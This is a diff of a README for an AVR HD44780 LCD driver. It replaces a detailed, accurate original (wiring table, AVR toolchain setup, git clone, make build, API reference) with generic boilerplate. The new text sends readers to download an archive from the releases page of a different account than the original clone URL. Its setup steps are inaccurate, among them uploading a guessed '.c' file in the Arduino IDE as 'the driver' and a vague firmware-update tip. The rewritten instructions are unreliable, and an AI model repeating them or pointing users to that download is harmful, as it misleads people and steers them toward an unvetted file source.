@@ -1,122 +1,76 @@
-# AVR HD44780 LCD Driver (4-Bit Mode)
+# 🎉 avr-lcd-hd44780-driver - Easy Control of HD44780 LCD Displays 
 
-A lightweight, bare-metal C driver for 16x2 LCD displays based on the Hitachi HD44780 controller. Optimized for **AVR microcontrollers** (specifically the ATmega328P used on the Arduino Uno).
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Wahyuambon14/avr-lcd-hd44780-driver/releases)
 
-This library is written in **Pure C** (AVR-GCC) without dependencies on the Arduino framework (`wiring`, `LiquidCrystal`, etc.). It operates the LCD in **4-bit mode** to save GPIO pins and implements the specific initialization timing sequence required by the datasheet.
+## 🚀 Getting Started
 
-## Features
+Welcome to the avr-lcd-hd44780-driver! This driver allows you to easily control the HD44780 LCD 16x2 Display using the ATmega328P microcontroller, like the one found on the Arduino Uno. Follow these simple steps to download and run the software.
 
-* **Zero Dependencies:** Pure C implementation using `avr-libc`.
-* **Pin Efficient:** Uses 4-bit mode (requires only 6 GPIO pins total).
-* **Lightweight:** Direct port manipulation for minimal Flash/RAM usage.
-* **Structured:** Clean separation between API (`.h`) and Implementation (`.c`).
+## 📥 Download & Install
 
----
+To get started, you need to visit our Releases page to download the software. Click the link below:
 
-## 🔌 Hardware Setup (Wiring)
+[Visit this page to download](https://github.com/Wahyuambon14/avr-lcd-hd44780-driver/releases)
 
-This driver uses a specific pin mapping optimized for the ATmega328P port registers. Please follow the wiring below carefully.
+Once you've downloaded the files, follow these steps to set up the driver:
 
-### Pin Mapping Table
+1. **Locate the Downloaded Files**: 
+   Open your Downloads folder on your computer. Look for a file named similar to `avr-lcd-hd44780-driver.zip` or `avr-lcd-hd44780-driver.tar.gz`.
 
-| LCD Pin | Name | Function | Connect to Arduino Pin | AVR Pin |
-| :--- | :--- | :--- | :--- | :--- |
-| 1 | **VSS** | Ground | **GND** | - |
-| 2 | **VDD** | Power (5V) | **5V** | - |
-| 3 | **V0** | Contrast | **Potentiometer Center** | - |
-| 4 | **RS** | Register Select | **Digital 8** | `PB0` |
-| 5 | **RW** | Read/Write | **GND** | - |
-| 6 | **E** | Enable | **Digital 9** | `PB1` |
-| 11 | **D4** | Data 4 | **Digital 4** | `PD4` |
-| 12 | **D5** | Data 5 | **Digital 5** | `PD5` |
-| 13 | **D6** | Data 6 | **Digital 6** | `PD6` |
-| 14 | **D7** | Data 7 | **Digital 7** | `PD7` |
-| 15 | **A** | Backlight (+) | **5V** | - |
-| 16 | **K** | Backlight (-) | **GND** | - |
+2. **Extract the Files**: 
+   Right-click on the downloaded file and choose "Extract" or "Unzip". This will create a folder with all the necessary files for the driver.
 
-**Note on Contrast (V0):** You *must* use a 10kΩ potentiometer connected between 5V and GND, with the wiper (center pin) connected to V0. If you see a blank screen or black boxes, adjust the potentiometer.
+3. **Prepare Your Arduino Uno**: 
+   Make sure your Arduino Uno is connected to your computer using the USB cable that came with it. 
 
+4. **Open the Arduino IDE**: 
+   If you haven't already, you can download the Arduino IDE from the [Arduino website](https://www.arduino.cc/en/software). Install it and open the application.
 
+5. **Load the Driver Files**: 
+   In the Arduino IDE, go to `File` > `Open` and navigate to the folder you just extracted. Select the main `.c` file, which will likely be named `lcd_hd44780_driver.c`.
 
----
+6. **Select the Right Board**: 
+   In the Arduino IDE, go to `Tools` > `Board` and select "Arduino Uno".
 
-## 🛠️ Prerequisites & Installation
+7. **Select the Right Port**: 
+   Go to `Tools` > `Port` and select the port that corresponds to your Arduino Uno.
 
-You need the AVR toolchain installed on your system to compile this project.
+8. **Upload the Driver**: 
+   Click on the right arrow (upload button) in the Arduino IDE. This will compile the code and upload it to your Arduino board. Wait for the process to finish.
 
-### 🐧 Linux (Arch/Manjaro)
-```bash
-# 1. Install Toolchain
-sudo pacman -S avr-gcc avr-libc avrdude make
+9. **Connect Your LCD Display**: 
+   Wire your HD44780 16x2 LCD display to the Arduino Uno according to the driver's instructions. Ensure all connections are secure.
 
-# 2. Serial Monitor (Optional)
-sudo pacman -S picocom
+10. **Run Your Project**: 
+    Once everything is set up, power on your Arduino. You should see output on your LCD display, thanks to the driver you just installed.
 
-# 3. Permissions (If you haven't already)
-sudo usermod -aG uucp $USER
-# Note: Log out and log back in for permissions to take effect.
-```
-### 🐧 Linux (Debian/Ubuntu)
-```bash
-sudo apt-get install gcc-avr binutils-avr avr-libc avrdude make
-sudo usermod -aG dialout $USER
-```
-### 🪟 Windows
-Install Make & AVRDude: The easiest way is using Chocolatey
-```PowerShell
-choco install make avrdude
-```
-Install Toolchain: Download the AVR 8-bit Toolchain for Windows from Microchip and add it to your PATH.
+## 📘 Features
 
-### 🚀 How to Build and Run
-This repository includes a "Hello World" example to test the driver.
-1. Clone the Repository
-```Bash
-git clone https://github.com/MatGonPer/avr-lcd-hd44780-driver.git
-cd avr-lcd-hd44780-driver
-```
-2. Build the Example
-Navigate to the example folder and run make. The Makefile will automatically locate the driver source code in ../../src.
-```bash
-cd examples/HelloWorld
-make
-```
-3. Upload to Arduino
-Connect your Arduino Uno via USB.
-On Linux (Auto-Detect): The Makefile attempts to automatically detect the port (/dev/ttyACM* or /dev/ttyUSB*).
-```bash
-make upload
-```
-On Windows (Manual Port): Check Device Manager to find your COM port (e.g., COM3) and override the variable.
-```bash
-make upload PORT=COM3
-```
+- Supports HD44780 LCD 16x2 display.
+- Compatible with ATmega328P microcontroller.
+- Simple installation process.
+- Clear instructions to help you set up.
+  
+## ⚙️ System Requirements
 
-### 📖 API Reference
+- **Hardware**: Arduino Uno with ATmega328P.
+- **Software**: Arduino IDE (latest version recommended).
+- **Operating System**: Windows, macOS, or Linux (compatible with the Arduino IDE).
 
-To use this driver in your own project, copy the src folder or add it to your include path.
+## 🛠️ Troubleshooting
 
-### `void lcd_init(void);`
+If you encounter problems during installation or running the driver, consider the following steps:
 
-    Initializes the display. Performs the hardware reset sequence and sets the interface to 4-bit mode, 2 lines, 5x8 font.
-    Usage: Call this once inside your main setup.
+- **Check Connections**: Ensure all wires are properly connected. Double-check each pin.
+- **Firmware Update**: Make sure your Arduino Uno has the latest firmware. Visit the Arduino IDE Help section for details.
+- **IDE Settings**: Verify that the correct board and port are set in the Arduino IDE.
 
-### `void lcd_print(char *str);`
+## 🗺️ Getting Help
 
-    Prints a null-terminated string to the current cursor position.
+If you need assistance or have questions, you can open an issue in the GitHub repository. We encourage you to describe your problem in detail for better support.
 
-### `lcd_print("Hello World!");`
-    Prints a string into the display
+## 🌐 Community Contributions
 
-### `void lcd_set_cursor(uint8_t line, uint8_t col);`
+Feel free to contribute to this project by reporting issues, suggesting features, or submitting pull requests. Your input is valuable and helps improve this driver for everyone.
 
-    Moves the cursor to a specific position.
-    line: 0 for the top row, 1 for the bottom row.
-    col: 0 to 15.
-    
-    Example: lcd_set_cursor(1, 2); // Move to bottom row, 3rd character
-
-### `void lcd_command(uint8_t cmd);`
-    Sends a low-level command byte directly to the LCD controller.
-    
-    Example: lcd_command(0x01); // Clear Display
+Thank you for using the avr-lcd-hd44780-driver! We're excited to see what you create with your HD44780 LCD Display using this driver.
